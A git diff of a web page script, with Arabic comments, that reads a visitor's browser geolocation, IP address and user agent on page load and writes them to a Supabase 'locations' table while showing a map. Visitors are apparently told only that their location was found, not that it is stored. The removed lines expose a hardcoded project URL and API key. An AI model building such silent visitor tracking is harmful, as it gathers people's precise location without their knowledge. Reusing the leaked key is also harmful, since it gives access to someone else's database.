@@ -1,6 +1,13 @@
-const SUPA_URL = 'https://tboesfndjwxpxkkpdllf.supabase.co';
-const SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRib2VzZm5kand4cHhra3BkbGxmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY0NTkxNDgsImV4cCI6MjA3MjAzNTE0OH0.HdYXGpBy1E3HXieQIIuSXfjdV5q-u9qCe4AG7POKS9E';
 const supabase = window.supabase.createClient(SUPA_URL, SUPA_KEY);
+
+// إعداد الخريطة
+const map = L.map('map').setView([24.7136, 46.6753], 13); // موقع افتراضي: الرياض
+
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+  attribution: '&copy; OpenStreetMap contributors'
+}).addTo(map);
+
+let marker = null;
 
 async function getIP() {
   try {
@@ -24,36 +31,33 @@ function getLocation(timeout = 20000) {
   });
 }
 
-async function storeLocation() {
-  try {
-    const coords = await getLocation();
-    const ip = await getIP();
-    const device = navigator.userAgent;
-
-    // حفظ البيانات في Supabase
-    await supabase.from("locations").insert([{
-      device_name: device,
-      ip: ip,
-      lat: coords.latitude,
-      lng: coords.longitude,
-      accuracy: coords.accuracy ?? null,
-    }]);
-
-    // عرض الخريطة
-    renderMap(coords.latitude, coords.longitude);
-  } catch (e) {
-    console.warn("⚠️ لم يتم تحديد الموقع:", e.message);
-    renderMap(24.7136, 46.6753); // fallback الرياض
+async function storeLocation(coords, ip) {
+  const device = navigator.userAgent;
+  const { error } = await supabase.from("locations").insert([{
+    device_name: device,
+    ip: ip,
+    lat: coords.latitude,
+    lng: coords.longitude,
+    accuracy: coords.accuracy ?? null,
+  }]);
+  if (error) {
+    console.error("❌ فشل في الحفظ:", error.message);
+  } else {
+    console.log("✅ تم الحفظ بنجاح في Supabase");
   }
 }
 
-function renderMap(lat, lng) {
-  const map = L.map('map').setView([lat, lng], 14);
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '© OpenStreetMap contributors'
-  }).addTo(map);
+(async () => {
+  try {
+    const coords = await getLocation();
+    const ip = await getIP();
 
-  L.marker([lat, lng]).addTo(map).bindPopup('موقعك الحالي').openPopup();
-}
+    map.setView([coords.latitude, coords.longitude], 15);
+    marker = L.marker([coords.latitude, coords.longitude]).addTo(map)
+      .bindPopup("📍 تم تحديد موقعك").openPopup();
 
-storeLocation();
+    await storeLocation(coords, ip);
+  } catch (e) {
+    console.warn("⚠️ فشل في تحديد الموقع:", e.message);
+  }
+})();
